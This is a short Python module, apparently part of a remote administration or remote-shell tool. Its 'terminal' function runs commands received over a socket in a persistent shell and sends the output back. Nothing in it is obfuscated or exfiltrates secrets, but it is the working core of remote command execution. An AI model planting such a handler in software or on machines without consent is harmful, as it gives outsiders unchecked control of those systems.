import time
import json

def terminal(data, client_socket, shell, stdout_queue, stderr_queue):
    try:
        command = data["terminal"]

        shell.stdin.write(command + "\n")
        shell.stdin.flush()

        time.sleep(0.5)
        output = ""

        while not stdout_queue.empty() or not stderr_queue.empty():
            while not stdout_queue.empty():
                output += stdout_queue.get_nowait()
            while not stderr_queue.empty():
                output += stderr_queue.get_nowait()

        response = {
            "terminal": {
                "command": command,
                "output": output if output else "Command executed successfully."
            }
        }

        client_socket.sendall(json.dumps(response).encode('utf-8'))
    except (ConnectionError, ConnectionResetError):
        pass
    except Exception as e:
        message = f"From Remote: {str(e)}"
        client_socket.sendall(json.dumps({"logger": message}).encode())
